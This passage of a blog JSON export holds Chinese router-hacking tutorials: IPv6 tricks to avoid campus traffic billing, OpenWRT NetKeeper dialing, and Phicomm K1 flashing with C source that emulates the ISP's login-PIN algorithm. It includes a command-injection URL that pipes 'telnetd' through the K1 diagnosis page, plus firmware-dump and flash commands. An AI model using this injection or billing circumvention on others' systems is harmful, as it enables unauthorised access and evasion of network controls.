8.8.4.4\n```\n\n码字不容易，在这里非常感谢[_Echo](http://www.jianshu.com/p/6559d6e4e7ab)和[张哲](https://www.zhangzhe.info/2016/03/openwrt-shadowsocks-ipv6/)两人的post.\n\n\n\u003e 转载自[Dyhube](http://www.jianshu.com/p/4d44172f1a5b)\n","cover":"","link":"2016/09/24/基于openwrt-shadowsocks-ipv6实现校园网免流量无限时长上网.html","preview":"\u003cblockquote\u003e\n\u003cp\u003e转载自\u003ca href=\"http://www.jianshu.com/p/4d44172f1a5b\"\u003eDyhube\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003ch1\u003e简述\u003c/h1\u003e\n\n\u003cp\u003e笔者利用笔记本电脑实现ipv6免费上网已经有一段时间了，原理是通过ipv6访问ipv4资源，在学校网络不限流量、不限时长、20兆带宽（我们学校ipv6限速上下对等20兆，没办法！）,电脑开热点全寝室共用，那真是爽翻天 !\u003c/p\u003e\n\n\u003cp\u003e\u003cimg src=\"data:image/gif;base64,R0lGODlhGAAYAPQAAP///wAAAM7Ozvr6+uDg4LCwsOjo6I6OjsjIyJycnNjY2KioqMDAwPLy8nd3d4aGhri4uGlpaQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAkHAAAAIf4aQ3JlYXRlZCB3aXRoIGFqYXhsb2FkLmluZm8AIf8LTkVUU0NBUEUyLjADAQAAACwAAAAAGAAYAAAFriAgjiQAQWVaDgr5POSgkoTDjFE0NoQ8iw8HQZQTDQjDn4jhSABhAAOhoTqSDg7qSUQwxEaEwwFhXHhHgzOA1xshxAnfTzotGRaHglJqkJcaVEqCgyoCBQkJBQKDDXQGDYaIioyOgYSXA36XIgYMBWRzXZoKBQUMmil0lgalLSIClgBpO0g+s26nUWddXyoEDIsACq5SsTMMDIECwUdJPw0Mzsu0qHYkw72bBmozIQAh+QQJBwAAACwAAAAAGAAYAAAFsCAgjiTAMGVaDgR5HKQwqKNxIKPjjFCk0KNXC6ATKSI7oAhxWIhezwhENTCQEoeGCdWIPEgzESGxEIgGBWstEW4QCGGAIJEoxGmGt5ZkgCRQQHkGd2CESoeIIwoMBQUMP4cNeQQGDYuNj4iSb5WJnmeGng0CDGaBlIQEJziHk3sABidDAHBgagButSKvAAoyuHuUYHgCkAZqebw0AgLBQyyzNKO3byNuoSS8x8OfwIchACH5BAkHAAAALAAAAAAYABgAAAW4ICCOJIAgZVoOBJkkpDKoo5EI43GMjNPSokXCINKJCI4HcCRIQEQvqIOhGhBHhUTDhGo4diOZyFAoKEQDxra2mAEgjghOpCgz3LTBIxJ5kgwMBShACREHZ1V4Kg1rS44pBAgMDAg/Sw0GBAQGDZGTlY+YmpyPpSQDiqYiDQoCliqZBqkGAgKIS5kEjQ21VwCyp76dBHiNvz+MR74AqSOdVwbQuo+abppo10ssjdkAnc0rf8vgl8YqIQAh+QQJBwAAACwAAAAAGAAYAAAFrCAgjiQgCGVaDgZZFCQxqKNRKGOSjMjR0qLXTyciHA7AkaLACMIAiwOC1iAxCrMToHHYjWQiA4NBEA0Q1RpWxHg4cMXxNDk4OBxNUkPAQAEXDgllKgMzQA1pSYopBgonCj9JEA8REQ8QjY+RQJOVl4ugoYssBJuMpYYjDQSliwasiQOwNakALKqsqbWvIohFm7V6rQAGP6+JQLlFg7KDQLKJrLjBKbvAor3IKiEAIfkECQcAAAAsAAAAABgAGAAABbUgII4koChlmhokw5DEoI4NQ4xFMQoJO4uuhignMiQWvxGBIQC+AJBEUyUcIRiyE6CR0CllW4HABxBURTUw4nC4FcWo5CDBRpQaCoF7VjgsyCUDYDMNZ0mHdwYEBAaGMwwHDg4HDA2KjI4qkJKUiJ6faJkiA4qAKQkRB3E0i6YpAw8RERAjA4tnBoMApCMQDhFTuySKoSKMJAq6rD4GzASiJYtgi6PUcs9Kew0xh7rNJMqIhYchACH5BAkHAAAALAAAAAAYABgAAAW0ICCOJEAQZZo2JIKQxqCOjWCMDDMqxT2LAgELkBMZCoXfyCBQiFwiRsGpku0EshNgUNAtrYPT0GQVNRBWwSKBMp98P24iISgNDAS4ipGA6JUpA2WAhDR4eWM/CAkHBwkIDYcGiTOLjY+FmZkNlCN3eUoLDmwlDW+AAwcODl5bYl8wCVYMDw5UWzBtnAANEQ8kBIM0oAAGPgcREIQnVloAChEOqARjzgAQEbczg8YkWJq8nSUhACH5BAkHAAAALAAAAAAYABgAAAWtICCOJGAYZZoOpKKQqDoORDMKwkgwtiwSBBYAJ2owGL5RgxBziQQMgkwoMkhNqAEDARPSaiMDFdDIiRSFQowMXE8Z6RdpYHWnEAWGPVkajPmARVZMPUkCBQkJBQINgwaFPoeJi4GVlQ2Qc3VJBQcLV0ptfAMJBwdcIl+FYjALQgimoGNWIhAQZA4HXSpLMQ8PIgkOSHxAQhERPw7ASTSFyCMMDqBTJL8tf3y2fCEAIfkECQcAAAAsAAAAABgAGAAABa8gII4k0DRlmg6kYZCoOg5EDBDEaAi2jLO3nEkgkMEIL4BLpBAkVy3hCTAQKGAznM0AFNFGBAbj2cA9jQixcGZAGgECBu/9HnTp+FGjjezJFAwFBQwKe2Z+KoCChHmNjVMqA21nKQwJEJRlbnUFCQlFXlpeCWcGBUACCwlrdw8RKGImBwktdyMQEQciB7oACwcIeA4RVwAODiIGvHQKERAjxyMIB5QlVSTLYLZ0sW8hACH5BAkHAAAALAAAAAAYABgAAAW0ICCOJNA0ZZoOpGGQrDoOBCoSxNgQsQzgMZyIlvOJdi+AS2SoyXrK4umWPM5wNiV0UDUIBNkdoepTfMkA7thIECiyRtUAGq8fm2O4jIBgMBA1eAZ6Knx+gHaJR4QwdCMKBxEJRggFDGgQEREPjjAMBQUKIwIRDhBDC2QNDDEKoEkDoiMHDigICGkJBS2dDA6TAAnAEAkCdQ8ORQcHTAkLcQQODLPMIgIJaCWxJMIkPIoAt3EhACH5BAkHAAAALAAAAAAYABgAAAWtICCOJNA0ZZoOpGGQrDoOBCoSxNgQsQzgMZyIlvOJdi+AS2SoyXrK4umWHM5wNiV0UN3xdLiqr+mENcWpM9TIbrsBkEck8oC0DQqBQGGIz+t3eXtob0ZTPgNrIwQJDgtGAgwCWSIMDg4HiiUIDAxFAAoODwxDBWINCEGdSTQkCQcoegADBaQ6MggHjwAFBZUFCm0HB0kJCUy9bAYHCCPGIwqmRq0jySMGmj6yRiEAIfkECQcAAAAsAAAAABgAGAAABbIgII4k0DRlmg6kYZCsOg4EKhLE2BCxDOAxnIiW84l2L4BLZKipBopW8XRLDkeCiAMyMvQAA+uON4JEIo+vqukkKQ6RhLHplVGN+LyKcXA4Dgx5DWwGDXx+gIKENnqNdzIDaiMECwcFRgQCCowiCAcHCZIlCgICVgSfCEMMnA0CXaU2YSQFoQAKUQMMqjoyAglcAAyBAAIMRUYLCUkFlybDeAYJryLNk6xGNCTQXY0juHghACH5BAkHAAAALAAAAAAYABgAAAWzICCOJNA0ZVoOAmkY5KCSSgSNBDE2hDyLjohClBMNij8RJHIQvZwEVOpIekRQJyJs5AMoHA+GMbE1lnm9EcPhOHRnhpwUl3AsknHDm5RN+v8qCAkHBwkIfw1xBAYNgoSGiIqMgJQifZUjBhAJYj95ewIJCQV7KYpzBAkLLQADCHOtOpY5PgNlAAykAEUsQ1wzCgWdCIdeArczBQVbDJ0NAqyeBb64nQAGArBTt8R8mLuyPyEAOw==\" data-src=\"http://7xusrl.com1.z0.glb.clouddn.com/ipv6.png\" alt=\"ipv6\" /\u003e\u003c/p\u003e\n","title":"基于Openwrt+Shadowsocks+ipv6实现校园网免流量无限时长上网"},{"content":"\n\n\n\n\u003e 文章来源于群友，如有侵权，请联系我(aha971030@gmail.com)删除\n\n# 原理介绍分析： #\n湖北E信地区可以使用ipv6拨号，好处是网络是上下对等不限速网络，也就是说，你的端口上限是多少，网上就可以达到多少，我测试很多次，一般在100M左右，但是遗憾的是，该拨号方式只能使用32位系统，且由于E信软件的兼容性问题，很容易导致蓝屏死机。经过大神的抓包分析，该拨号方式是使用ipv6的隧道协议传递ipv4信号。而幸运的是，现在的openwrt支持该协议。也就是说可以使用基于openwrt的路由器采用ipv6拨号。\n\n# 操作步骤： #\n\n首先要明确是，该拨号方式也是需要进行账号换算的，首先启动路由器，并插上网线，在电脑上下载winscp这款软件，然后我们查询一下我们的ip地址，在电脑的dos界面输入ipconfig，找到以太网配置器\n\n![network111](http://7xusrl.com1.z0.glb.clouddn.com/network111.png)\n\n\n\n默认网关就是路由器的管理ip。\n\n然后我们启动软件，按照图片设置填入数据\n\n![winscp111](http://7xusrl.com1.z0.glb.clouddn.com/winscp111.png)\n\n然后我们就进入了路由器的文件系统\n\n![op-config](http://7xusrl.com1.z0.glb.clouddn.com/op-config.png)\n\n接着，我们要做的是，进入路由器设置里面设置相关端口参数\n\n在电脑的浏览器里输入管理ip地址\n\n![sk1530](http://7xusrl.com1.z0.glb.clouddn.com/sk1530.png)\n\n进入端口设置界面\n\n首先设置wan口参数\n\n![op-01](http://7xusrl.com1.z0.glb.clouddn.com/op-01.png)\n\n![op-02](http://7xusrl.com1.z0.glb.clouddn.com/op-02.png)\n\n切换协议为PPPOE，并随便输入账号密码（具体的拨号的账号密码在后面我们会加以更改）并在高级设置里勾选以下参数\n\n![op-03](http://7xusrl.com1.z0.glb.clouddn.com/op-03.png)\n\n然后保存并应用\n\n然后我们设置lan口参数\n\n![op-04](http://7xusrl.com1.z0.glb.clouddn.com/op-04.png)\n\n按照该图设置\n\n最后，我们回到接口总界面，自己创建一个端口\n\n![op-05](http://7xusrl.com1.z0.glb.clouddn.com/op-05.png)\n\n名字无所谓，但协议要选择rfc6333\n\n![op-06](http://7xusrl.com1.z0.glb.clouddn.com/op-06.png)\n\n提交以后填写ipv6的地址，经过大神的尝试，下面给的这个地址是比较稳定的，建议使用\n\n![op-07](http://7xusrl.com1.z0.glb.clouddn.com/op-07.png)\n\n240e:d:1000::ffff:1:\n并在高级设置里面勾选默认网关\n\n![op-08](http://7xusrl.com1.z0.glb.clouddn.com/op-08.png)\n\n在防火墙设置里，把这个链接拉到wan口里\n\n![op-09](http://7xusrl.com1.z0.glb.clouddn.com/op-09.png)\n\n最后保存\n\n这样，路由器上的设置就结束了，下面转入配置文件的修改上\n\n依次顺序进入到如下路径\n\n![op-10](http://7xusrl.com1.z0.glb.clouddn.com/op-10.png)\n\n双击network文件打开\n\n并在文件的位置更改\n\n![op-11](http://7xusrl.com1.z0.glb.clouddn.com/op-11.png)\n\n然后点击保存\n\n然后进入到此目录，上传我们准备的E信算法库文件\n\n![op-12](http://7xusrl.com1.z0.glb.clouddn.com/op-12.png)\n\n最后重启一下路由器，同步一下路由器的时间，就可以了\n注意，不同的芯片和不同地区的openwrt路由器，sxplugin.so文件是不一样的，具体请查看我上一篇文章打包的东西。\n\n\u003e 再说一次，文章来源于群友，如有侵权，请联系我(aha971030@gmail.com)删除\n","cover":"","link":"2016/09/22/openwrt路由器使用ipv6拨号上网教程.html","preview":"\u003cblockquote\u003e\n\u003cp\u003e文章来源于群友，如有侵权，请联系我(aha971030@gmail.com)删除\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003ch1\u003e原理介绍分析：\u003c/h1\u003e\n\n\u003cp\u003e湖北E信地区可以使用ipv6拨号，好处是网络是上下对等不限速网络，也就是说，你的端口上限是多少，网上就可以达到多少，我测试很多次，一般在100M左右，但是遗憾的是，该拨号方式只能使用32位系统，且由于E信软件的兼容性问题，很容易导致蓝屏死机。经过大神的抓包分析，该拨号方式是使用ipv6的隧道协议传递ipv4信号。而幸运的是，现在的openwrt支持该协议。也就是说可以使用基于openwrt的路由器采用ipv6拨号。\u003c/p\u003e\n\n\u003ch1\u003e操作步骤：\u003c/h1\u003e\n\n\u003cp\u003e首先要明确是，该拨号方式也是需要进行账号换算的，首先启动路由器，并插上网线，在电脑上下载winscp这款软件，然后我们查询一下我们的ip地址，在电脑的dos界面输入ipconfig，找到以太网配置器\u003c/p\u003e\n\n\u003cp\u003e\u003cimg src=\"data:image/gif;base64,R0lGODlhGAAYAPQAAP///wAAAM7Ozvr6+uDg4LCwsOjo6I6OjsjIyJycnNjY2KioqMDAwPLy8nd3d4aGhri4uGlpaQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAkHAAAAIf4aQ3JlYXRlZCB3aXRoIGFqYXhsb2FkLmluZm8AIf8LTkVUU0NBUEUyLjADAQAAACwAAAAAGAAYAAAFriAgjiQAQWVaDgr5POSgkoTDjFE0NoQ8iw8HQZQTDQjDn4jhSABhAAOhoTqSDg7qSUQwxEaEwwFhXHhHgzOA1xshxAnfTzotGRaHglJqkJcaVEqCgyoCBQkJBQKDDXQGDYaIioyOgYSXA36XIgYMBWRzXZoKBQUMmil0lgalLSIClgBpO0g+s26nUWddXyoEDIsACq5SsTMMDIECwUdJPw0Mzsu0qHYkw72bBmozIQAh+QQJBwAAACwAAAAAGAAYAAAFsCAgjiTAMGVaDgR5HKQwqKNxIKPjjFCk0KNXC6ATKSI7oAhxWIhezwhENTCQEoeGCdWIPEgzESGxEIgGBWstEW4QCGGAIJEoxGmGt5ZkgCRQQHkGd2CESoeIIwoMBQUMP4cNeQQGDYuNj4iSb5WJnmeGng0CDGaBlIQEJziHk3sABidDAHBgagButSKvAAoyuHuUYHgCkAZqebw0AgLBQyyzNKO3byNuoSS8x8OfwIchACH5BAkHAAAALAAAAAAYABgAAAW4ICCOJIAgZVoOBJkkpDKoo5EI43GMjNPSokXCINKJCI4HcCRIQEQvqIOhGhBHhUTDhGo4diOZyFAoKEQDxra2mAEgjghOpCgz3LTBIxJ5kgwMBShACREHZ1V4Kg1rS44pBAgMDAg/Sw0GBAQGDZGTlY+YmpyPpSQDiqYiDQoCliqZBqkGAgKIS5kEjQ21VwCyp76dBHiNvz+MR74AqSOdVwbQuo+abppo10ssjdkAnc0rf8vgl8YqIQAh+QQJBwAAACwAAAAAGAAYAAAFrCAgjiQgCGVaDgZZFCQxqKNRKGOSjMjR0qLXTyciHA7AkaLACMIAiwOC1iAxCrMToHHYjWQiA4NBEA0Q1RpWxHg4cMXxNDk4OBxNUkPAQAEXDgllKgMzQA1pSYopBgonCj9JEA8REQ8QjY+RQJOVl4ugoYssBJuMpYYjDQSliwasiQOwNakALKqsqbWvIohFm7V6rQAGP6+JQLlFg7KDQLKJrLjBKbvAor3IKiEAIfkECQcAAAAsAAAAABgAGAAABbUgII4koChlmhokw5DEoI4NQ4xFMQoJO4uuhignMiQWvxGBIQC+AJBEUyUcIRiyE6CR0CllW4HABxBURTUw4nC4FcWo5CDBRpQaCoF7VjgsyCUDYDMNZ0mHdwYEBAaGMwwHDg4HDA2KjI4qkJKUiJ6faJkiA4qAKQkRB3E0i6YpAw8RERAjA4tnBoMApCMQDhFTuySKoSKMJAq6rD4GzASiJYtgi6PUcs9Kew0xh7rNJMqIhYchACH5BAkHAAAALAAAAAAYABgAAAW0ICCOJEAQZZo2JIKQxqCOjWCMDDMqxT2LAgELkBMZCoXfyCBQiFwiRsGpku0EshNgUNAtrYPT0GQVNRBWwSKBMp98P24iISgNDAS4ipGA6JUpA2WAhDR4eWM/CAkHBwkIDYcGiTOLjY+FmZkNlCN3eUoLDmwlDW+AAwcODl5bYl8wCVYMDw5UWzBtnAANEQ8kBIM0oAAGPgcREIQnVloAChEOqARjzgAQEbczg8YkWJq8nSUhACH5BAkHAAAALAAAAAAYABgAAAWtICCOJGAYZZoOpKKQqDoORDMKwkgwtiwSBBYAJ2owGL5RgxBziQQMgkwoMkhNqAEDARPSaiMDFdDIiRSFQowMXE8Z6RdpYHWnEAWGPVkajPmARVZMPUkCBQkJBQINgwaFPoeJi4GVlQ2Qc3VJBQcLV0ptfAMJBwdcIl+FYjALQgimoGNWIhAQZA4HXSpLMQ8PIgkOSHxAQhERPw7ASTSFyCMMDqBTJL8tf3y2fCEAIfkECQcAAAAsAAAAABgAGAAABa8gII4k0DRlmg6kYZCoOg5EDBDEaAi2jLO3nEkgkMEIL4BLpBAkVy3hCTAQKGAznM0AFNFGBAbj2cA9jQixcGZAGgECBu/9HnTp+FGjjezJFAwFBQwKe2Z+KoCChHmNjVMqA21nKQwJEJRlbnUFCQlFXlpeCWcGBUACCwlrdw8RKGImBwktdyMQEQciB7oACwcIeA4RVwAODiIGvHQKERAjxyMIB5QlVSTLYLZ0sW8hACH5BAkHAAAALAAAAAAYABgAAAW0ICCOJNA0ZZoOpGGQrDoOBCoSxNgQsQzgMZyIlvOJdi+AS2SoyXrK4umWPM5wNiV0UDUIBNkdoepTfMkA7thIECiyRtUAGq8fm2O4jIBgMBA1eAZ6Knx+gHaJR4QwdCMKBxEJRggFDGgQEREPjjAMBQUKIwIRDhBDC2QNDDEKoEkDoiMHDigICGkJBS2dDA6TAAnAEAkCdQ8ORQcHTAkLcQQODLPMIgIJaCWxJMIkPIoAt3EhACH5BAkHAAAALAAAAAAYABgAAAWtICCOJNA0ZZoOpGGQrDoOBCoSxNgQsQzgMZyIlvOJdi+AS2SoyXrK4umWHM5wNiV0UN3xdLiqr+mENcWpM9TIbrsBkEck8oC0DQqBQGGIz+t3eXtob0ZTPgNrIwQJDgtGAgwCWSIMDg4HiiUIDAxFAAoODwxDBWINCEGdSTQkCQcoegADBaQ6MggHjwAFBZUFCm0HB0kJCUy9bAYHCCPGIwqmRq0jySMGmj6yRiEAIfkECQcAAAAsAAAAABgAGAAABbIgII4k0DRlmg6kYZCsOg4EKhLE2BCxDOAxnIiW84l2L4BLZKipBopW8XRLDkeCiAMyMvQAA+uON4JEIo+vqukkKQ6RhLHplVGN+LyKcXA4Dgx5DWwGDXx+gIKENnqNdzIDaiMECwcFRgQCCowiCAcHCZIlCgICVgSfCEMMnA0CXaU2YSQFoQAKUQMMqjoyAglcAAyBAAIMRUYLCUkFlybDeAYJryLNk6xGNCTQXY0juHghACH5BAkHAAAALAAAAAAYABgAAAWzICCOJNA0ZVoOAmkY5KCSSgSNBDE2hDyLjohClBMNij8RJHIQvZwEVOpIekRQJyJs5AMoHA+GMbE1lnm9EcPhOHRnhpwUl3AsknHDm5RN+v8qCAkHBwkIfw1xBAYNgoSGiIqMgJQifZUjBhAJYj95ewIJCQV7KYpzBAkLLQADCHOtOpY5PgNlAAykAEUsQ1wzCgWdCIdeArczBQVbDJ0NAqyeBb64nQAGArBTt8R8mLuyPyEAOw==\" data-src=\"http://7xusrl.com1.z0.glb.clouddn.com/network111.png\" alt=\"network111\" /\u003e\u003c/p\u003e\n","title":"OpenWRT路由器使用ipv6拨号上网教程"},{"content":"\n\n\n\n# ◆购买斐讯k1路由器\n\n路由器在天猫京东斐讯旗舰店都有售卖，我买的价格是159，不过有一张铃铛卡，一个月之后返还160元，相当于0元购\n\n# ◆路由器刷不死Breed\n\n## 1.路由与电脑有线连接好，输入192.168.2.1，完成设置\n![k1basicSetting](http://7xusrl.com1.z0.glb.clouddn.com/k1basicSetting.png)\n\n## 2.在浏览器地址栏输入：http://192.168.2.1/goform/Diagnosis?pingAddr=192.168.2.100|echo\"\"|telnetd\n(如果你的电脑ip不是192.168.2.100,请改成你电脑的ip(内网ip))\n\n\n\n## 3.打开tftp，这里用tftp32演示，按图设置\n![tftpK1Setting](http://7xusrl.com1.z0.glb.clouddn.com/tftpK1Setting.png)\n\n## 4.打开CMD,务必使用管理员权限，telnet 192.168.2.1\n![cmdK1Serting](http://7xusrl.com1.z0.glb.clouddn.com/cmdK1Serting.png)\n\n## 5.输入用户名密码\n![cmd2K1Serting](http://7xusrl.com1.z0.glb.clouddn.com/cmd2K1Serting.png)\n\n## 6.输入命令\n```cmd\n 1) cd /tmp\n\n 2) tftp –g –l /tmp/breed.bin –r breed.bin 192.168.2.100\n\n 3) cat /dev/mtd1 \u003e/tmp/mtd1.bin\n   cat /dev/mtd0 \u003e/tmp/mtd0.bin\n\n 4) tftp –p –r mtd1.bin –l /tmp/mtd1.bin 192.168.2.100\n   tftp –p –r mtd1.bin –l /tmp/mtd1.bin 192.168.2.100\n\n 5) mtd_write write breed.bin Bootloader\n```\n等待出现#字\n![cmd3K1Serting](http://7xusrl.com1.z0.glb.clouddn.com/cmd3K1Serting.png)\n\n## 7.拔掉电源，然后按住reset键插上电源，地址栏输入192.168.1.1，就进入了breed界面\n![K1breed](http://7xusrl.com1.z0.glb.clouddn.com/K1breed.png)\n\n### 懒人一键式安装法：\n\n输入：\nwget http://breed.hackpascal.net/breed-mt7620-reset1.bin\n然后输入：\nmtd_write write breed-mt7620-reset1.bin Bootloader\n\n等待出现#字（代表着已经完成）\n\n## 刷breed后语\n\n只要路由breed不被变动，路由刷错固件也不怕，同样方式进入breed刷回正确的即可。\n\n推荐每次刷完固件后，去固件系统管理--恢复原厂默认值。\n\n# ◆刷openWRT\n## 1.刷新固件\n我在下面的文件中打包了两个固件，一个是潘多拉的K1专版，一个是openWRT，我自己使用的是专版潘多拉，各位看官自己选择，刷新固件很简单，看图\n![set1](http://7xusrl.com1.z0.glb.clouddn.com/K1breedset1.png)\n![set2](http://7xusrl.com1.z0.glb.clouddn.com/K1breedset2.png)\n\n点击更新，看路由灯全部亮起后，无线网络出现,OK\n\n# ◆安装e信(NetKeeper)插件并进行拨号\n## 1.你得准备一些东西(WINSCP一个，op系统相关netkeeper一只）找到对应地区更改文件名为`sxplugin.so`\n\n## 2.通过WINSCP登录你的路由器\n** 注意使用scp协议，密码admin（第一次登录op需要重设密码依然设为admin就可以了 **\n\n![winscpK1set](http://7xusrl.com1.z0.glb.clouddn.com/winscpK1set.png)\n\n## 3.放入拨号插件\n\n登录之后打开路由器，在这儿选择/(root）然后选择/usr/lib/pppd/2.4.7文件夹将你编辑好的`sxplugin.so`文件放入即可（** 这里的sxplugin.so是自己更名的，湖北的就选择wuhan的来更名，文件在文末有打包 ** ）\n\n## 4.设置帐号密码拨号\n\n通过浏览器登录浏览器打开网络下的接口选择WAN口点击修改，协议选择PPPOE即可，然后下面有个按钮点一下会出来填帐号密码的，账户和密码也要写对，我是重庆动态密码可以正常用。（蓝字我是加了中文包的，你刷了过后是英文呢，凑合看吧，加中文包需要路由器联网。）\n\n![op](http://7xusrl.com1.z0.glb.clouddn.com/openWRTK1.png)\n![op2](http://7xusrl.com1.z0.glb.clouddn.com/openWRTK1wan.png)\n\n最后点击保存应用退出\n\n## 5.最后的配置\n通过WINSCP登录路由器同样打开文件夹/etc/config/找到network修改\n![K1network](http://7xusrl.com1.z0.glb.clouddn.com/K1network.png)\n\n在图中的位置输入option 'pppd_options' 'plugin sxplugin.so'这个代码即可（注意粘贴后字体是否一致，主要是‘号的问题，可保存后再打开查看，必须搞定字体格式才行），到此netkeeper就安装完了。最后重启路由器，到系统里面选时区，同步浏览器时间，保存。再到wan点击连接就能联网了。（如果进不去wan这个界面就是设置错了）\n\n![k1lastsetting](http://7xusrl.com1.z0.glb.clouddn.com/k1lastsetting.png)\n\n\u003e 最后要说的，这个可用的原因是湖北地区e信2.5的算法依旧可用，有的地区加了心跳，有的地区强制升级了，并不可用,教程到此处完结，后面的有能力可以看看，工具教程打包在文末\n\n# ◆闪讯算法源码\n```c\n#include \u003cstdio.h\u003e\n#include \u003cstdlib.h\u003e\n#include \u003ctime.h\u003e\n#include \u003cstring.h\u003e\n#include \u003cpppd/pppd.h\u003e\n#include \u003cpppd/md5.h\u003e\n\ntypedef unsigned char byte;\n\nchar pppd_version[] = VERSION;\n\nstatic char saveuser[MAXNAMELEN] = {0};\nstatic char savepwd[MAXSECRETLEN] = {0};\n\nstatic void getPIN(byte *userName, byte *PIN)\n{\n    int i,j;//循环变量\n    long timedivbyfive;//时间除以五\n    time_t timenow;//当前时间，从time()获得\n    byte RADIUS[16];//凑位字符\n    byte timeByte[4];//时间 div 5\n    byte beforeMD5[32];//时间 div 5+用户名+凑位\n    MD5_CTX md5;//MD5结构体\n    byte afterMD5[16];//MD5输出\n    byte MD501H[2]; //MD5前两位\n    byte MD501[3];\n    byte timeHash[4]; //时间div5经过第一次转后后的值\n    byte temp[32]; //第一次转换时所用的临时数组\n    byte PIN27[6]; //PIN的2到7位，由系统时间转换\n\n    //code\n    info(\"sxplugin : using zjxinlisx01\");\n    strcpy(RADIUS, \"zjxinlisx01\");\n    timenow = time(NULL);\n    timedivbyfive = timenow / 5;\n\n    for(i = 0; i \u003c 4; i++) {\n        timeByte[i] = (byte)(timedivbyfive \u003e\u003e (8 * (3 - i)) \u0026 0xFF);\n    }\n    for(i = 0; i \u003c 4; i++) {\n        beforeMD5[i]= timeByte[i];\n    }\n    for(i = 4; i \u003c 16 \u0026\u0026 userName[i-4]!='@' ; i++) {\n        beforeMD5[i] = userName[i-4];\n    }\n    j=0;\n    while(RADIUS[j]!='\\0')\n        beforeMD5[i++] = RADIUS[j++];\n\n    MD5_Init(\u0026md5);\n    MD5_Update (\u0026md5, beforeMD5, i);\n    printf(\"%d %s\\n\",i,beforeMD5);\n    MD5_Final (afterMD5, \u0026md5);\n\n    MD501H[0] = afterMD5[0] \u003e\u003e 4 \u0026 0xF;\n    MD501H[1] = afterMD5[0] \u0026 0xF;\n\n    sprintf(MD501,\"%x%x\",MD501H[0],MD501H[1]);\n\n    for(i = 0; i \u003c 32; i++) {\n        temp[i] = timeByte[(31 - i) / 8] \u0026 1;\n        timeByte[(31 - i) / 8] = timeByte[(31 - i) / 8] \u003e\u003e 1;\n    }\n\n    for (i = 0; i \u003c 4; i++) {\n        timeHash[i] = temp[i] * 128 + temp[4 + i] * 64 + temp[8 + i]\n            * 32 + temp[12 + i] * 16 + temp[16 + i] * 8 + temp[20 + i]\n            * 4 + temp[24 + i] * 2 + temp[28 + i];\n    }\n\n    temp[1] = (timeHash[0] \u0026 3) \u003c\u003c 4;\n    temp[0] = (timeHash[0] \u003e\u003e 2) \u0026 0x3F;\n    temp[2] = (timeHash[1] \u0026 0xF) \u003c\u003c 2;\n    temp[1] = (timeHash[1] \u003e\u003e 4 \u0026 0xF) + temp[1];\n    temp[3] = timeHash[2] \u0026 0x3F;\n    temp[2] = ((timeHash[2] \u003e\u003e 6) \u0026 0x3) + temp[2];\n    temp[5] = (timeHash[3] \u0026 3) \u003c\u003c 4;\n    temp[4] = (timeHash[3] \u003e\u003e 2) \u0026 0x3F;\n\n    for (i = 0; i \u003c 6; i++) {\n        PIN27[i] = temp[i] + 0x020;\n        if(PIN27[i]\u003e=0x40) {\n            PIN27[i]++;\n        }\n    }\n\n    PIN[0] = '\\r';\n    PIN[1] = '\\n';\n\n    memcpy(PIN+2, PIN27, 6);\n\n    PIN[8] = MD501[0];\n    PIN[9] = MD501[1];\n\n    strcpy(PIN+10, userName);\n}\n\nstatic int pap_modifyusername(char *user, char* passwd)\n{\n    byte PIN[MAXSECRETLEN] = {0};\n    getPIN(saveuser, PIN);\n    strcpy(user, PIN);\n    info(\"sxplugin : user  is %s \",user);\n}\n\nstatic int check(){\n    return 1;\n}\n\nvoid plugin_init(void)\n{\n    info(\"sxplugin : init\");\n    strcpy(saveuser,user);\n    strcpy(savepwd,passwd);\n    pap_modifyusername(user, saveuser);\n    info(\"sxplugin : passwd loaded\");\n    pap_check_hook=check;\n    chap_check_hook=check;\n}\n```\n\n# ◆下载地址\n[  (访问码:4854)](http://cloud.189.cn/t/umuUBrQNNRfi )\n","cover":"","link":"2016/09/22/给斐讯k1刷机并拨号e信-湖北地区测试无问题.html","preview":"\u003ch1\u003e◆购买斐讯k1路由器\u003c/h1\u003e\n\n\u003cp\u003e路由器在天猫京东斐讯旗舰店都有售卖，我买的价格是159，不过有一张铃铛卡，一个月之后返还160元，相当于0元购\u003c/p\u003e\n\n\u003ch1\u003e◆路由器刷不死Breed\u003c/h1\u003e\n\n\u003ch2\u003e1.路由与电脑有线连接好，输入192.168.2.1，完成设置\u003c/h2\u003e\n\n\u003cp\u003e\u003cimg src=\"data:image/gif;base64,R0lGODlhGAAYAPQAAP///wAAAM7Ozvr6+uDg4LCwsOjo6I6OjsjIyJycnNjY2KioqMDAwPLy8nd3d4aGhri4uGlpaQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAkHAAAAIf4aQ3JlYXRlZCB3aXRoIGFqYXhsb2FkLmluZm8AIf8LTkVUU0NBUEUyLjADAQAAACwAAAAAGAAYAAAFriAgjiQAQWVaDgr5POSgkoTDjFE0NoQ8iw8HQZQTDQjDn4jhSABhAAOhoTqSDg7qSUQwxEaEwwFhXHhHgzOA1xshxAnfTzotGRaHglJqkJcaVEqCgyoCBQkJBQKDDXQGDYaIioyOgYSXA36XIgYMBWRzXZoKBQUMmil0lgalLSIClgBpO0g+s26nUWddXyoEDIsACq5SsTMMDIECwUdJPw0Mzsu0qHYkw72bBmozIQAh+QQJBwAAACwAAAAAGAAYAAAFsCAgjiTAMGVaDgR5HKQwqKNxIKPjjFCk0KNXC6ATKSI7oAhxWIhezwhENTCQEoeGCdWIPEgzESGxEIgGBWstEW4QCGGAIJEoxGmGt5ZkgCRQQHkGd2CESoeIIwoMBQUMP4cNeQQGDYuNj4iSb5WJnmeGng0CDGaBlIQEJziHk3sABidDAHBgagButSKvAAoyuHuUYHgCkAZqebw0AgLBQyyzNKO3byNuoSS8x8OfwIchACH5BAkHAAAALAAAAAAYABgAAAW4ICCOJIAgZVoOBJkkpDKoo5EI43GMjNPSokXCINKJCI4HcCRIQEQvqIOhGhBHhUTDhGo4diOZyFAoKEQDxra2mAEgjghOpCgz3LTBIxJ5kgwMBShACREHZ1V4Kg1rS44pBAgMDAg/Sw0GBAQGDZGTlY+YmpyPpSQDiqYiDQoCliqZBqkGAgKIS5kEjQ21VwCyp76dBHiNvz+MR74AqSOdVwbQuo+abppo10ssjdkAnc0rf8vgl8Y